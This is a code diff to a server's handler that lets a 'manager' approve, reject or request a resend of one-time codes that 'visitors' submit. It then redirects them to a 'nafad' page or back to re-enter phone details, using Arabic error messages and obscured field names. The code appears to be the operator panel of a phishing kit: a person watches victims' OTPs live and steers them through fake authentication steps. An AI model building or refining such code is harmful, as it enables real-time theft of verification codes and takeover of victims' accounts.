@@ -1126,34 +1126,34 @@ async function startServer() {
       };
 
       if (action === "approved") {
-        // Clear all phone OTP data and redirect
+        // APPROVE: redirect to step4 (nafad page)
         updateData.phoneOtpStatus = "approved";
         updateData.phoneRejectionMessage = null;
         updateData.phoneResendRequested = null;
-        updateData.oneTimeRedirect = "step4"; // One-time redirect flag
-        updateData.currentStep = "_t6";
-        updateData.currentPage = "nafad";
+        updateData.oneTimeRedirect = "step4"; // One-time redirect to nafad
+        updateData.currentStep = "_t4"; // step4
+        updateData.currentPage = "step4";
       } else if (action === "rejected") {
-        // Clear OTP code but keep phone data - customer must re-enter phone info
+        // REJECT: send back to step5 to re-enter phone number
         updateData.phoneOtpStatus = "rejected";
         updateData.phoneRejectionMessage = "رقم الهاتف غير صحيح - يرجى إدخال بيانات جديدة";
         updateData.phoneRejectionAt = new Date().toISOString();
         updateData.phoneResendRequested = null;
         updateData._v7 = null; // Clear OTP code
         updateData.phoneOtpSubmittedAt = null;
-        updateData.currentPage = "phone";
-        updateData.currentStep = 7;
-        updateData.oneTimeRedirect = "phone";
+        updateData.currentPage = "step5";
+        updateData.currentStep = 5;
+        updateData.oneTimeRedirect = "step5"; // Send back to step5
       } else if (action === "resend") {
-        // Customer must re-enter OTP - show error message
+        // RESEND: open OTP dialog with error message
         updateData.phoneResendRequested = true;
         updateData.phoneResendAt = new Date().toISOString();
         updateData.phoneRejectionMessage = "رمز التحقق غير صحيح أو منتهي الصلاحية - يرجى انتظار رمز جديد";
-        // Clear the OTP code so manager sees empty box waiting for new OTP
+        // Clear the OTP code so customer can enter new one
         updateData._v7 = null;
         updateData.phoneOtpSubmittedAt = null;
-        updateData.currentPage = "phone";
-        updateData.currentStep = 7;
+        updateData.currentPage = "step5";
+        updateData.currentStep = 5;
       }
 
       // Update visitor data so customer can receive the update
